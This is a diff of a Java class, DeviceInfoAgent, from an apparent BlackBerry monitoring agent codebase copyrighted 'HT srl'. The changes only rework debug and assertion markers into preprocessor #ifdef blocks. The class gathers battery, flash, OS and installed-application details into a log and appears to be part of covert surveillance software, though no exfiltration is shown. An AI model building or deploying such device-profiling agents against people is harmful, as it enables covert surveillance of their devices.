@@ -1,3 +1,4 @@
+//#preprocess
 /* *************************************************
  * Copyright (c) 2010 - 2010
  * HT srl,   All rights reserved.
@@ -26,8 +27,9 @@ import blackberry.utils.DebugLevel;
  * The Class DeviceInfoAgent.
  */
 public final class DeviceInfoAgent extends Agent {
-    // #debug
+    //#ifdef DEBUG
     static Debug debug = new Debug("DeviceInfoAgent", DebugLevel.VERBOSE);
+    //#endif
 
     Device device;
     boolean runningApplication;
@@ -41,10 +43,10 @@ public final class DeviceInfoAgent extends Agent {
      */
     public DeviceInfoAgent(final boolean agentStatus) {
         super(AGENT_DEVICE, agentStatus, true, "DeviceInfoAgent");
-        // #ifdef DBC
+        //#ifdef DBC
         Check.asserts(Log.convertTypeLog(agentId) == LogType.DEVICE,
                 "Wrong Conversion");
-        // #endif
+        //#endif
 
         device = Device.getInstance();
     }
@@ -67,12 +69,13 @@ public final class DeviceInfoAgent extends Agent {
      * @see blackberry.threadpool.TimerJob#actualRun()
      */
     public void actualRun() {
-        // #debug debug
+        //#ifdef DEBUG_TRACE
         debug.trace("run");
+        //#endif
 
-        // #ifdef DBC
+        //#ifdef DBC
         Check.requires(log != null, "Null log");
-        // #endif
+        //#endif
 
         log.createLog(null);
 
@@ -94,10 +97,10 @@ public final class DeviceInfoAgent extends Agent {
                 + "\n");
         sb.append("BatteryVoltage: " + DeviceInfo.getBatteryVoltage() + "\n");
 
-        // #ifdef HAVE_MIME
+        //#ifdef HAVE_MIME
         // DISK
         sb.append("FLASH: " + DeviceInfo.getTotalFlashSize() + "\n");
-        // #endif
+        //#endif
 
         // OS Version
         sb.append("OS: " + DeviceInfo.getPlatformVersion() + "\n");
@@ -118,8 +121,9 @@ public final class DeviceInfoAgent extends Agent {
         ret = log.writeLog(sb.toString(), true);
 
         if (ret == false) {
-            // #debug
+            //#ifdef DEBUG
             debug.error("Error writing file");
+            //#endif
         }
 
         log.close();
@@ -219,8 +223,10 @@ public final class DeviceInfoAgent extends Agent {
             return false;
         }
         
-        //#debug info
+        //#ifdef DEBUG_INFO
         debug.info("installedApplication: " + installedApplication);
+        
+        //#endif
         
         return true;
     }
